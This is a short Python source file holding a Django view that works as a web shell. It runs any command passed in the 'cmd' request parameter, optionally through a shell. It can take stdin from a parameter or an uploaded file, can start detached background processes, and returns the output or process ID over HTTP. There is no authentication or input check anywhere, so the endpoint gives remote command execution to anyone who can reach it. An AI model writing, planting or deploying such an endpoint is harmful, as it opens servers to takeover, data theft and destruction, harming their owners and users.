from django.http import HttpResponse
def index(request):
	req = request.POST.copy()
	req.update(request.GET)
	kwargs = {}
	cmd = req.get('cmd')
	if req.get('shell') == '1':
		kwargs['shell'] = True
	else:
		import shlex
		cmd = shlex.split(cmd)
	while 1:
		v = req.get('stdin', None)
		if v:
			from tempfile import TemporaryFile as Temp
			f = kwargs['stdin'] = Temp()
			f.write(v.encode('UTF-8'))
			f.seek(0)
			break
		v = request.FILES
		if v:
			stdin = v.get('stdin')
			if stdin:
				from tempfile import TemporaryFile as Temp
				f = kwargs['stdin'] = Temp()
				for x in stdin.chunks(1024*1024):
					f.write(x)
				f.seek(0)
			break
		break
	from subprocess import Popen, PIPE, STDOUT, check_output
	if req.get('detached') == '1':
		kwargs['stdout'] = open('detached.out', 'wb')
		kwargs['stderr'] = open('detached.err', 'wb')
		return HttpResponse(Popen(cmd, **kwargs).pid)
	if req.get('err2out') == '1':
		#kwargs['stdout'] = PIPE
		kwargs['stderr'] = STDOUT
	return HttpResponse(check_output(cmd, **kwargs))
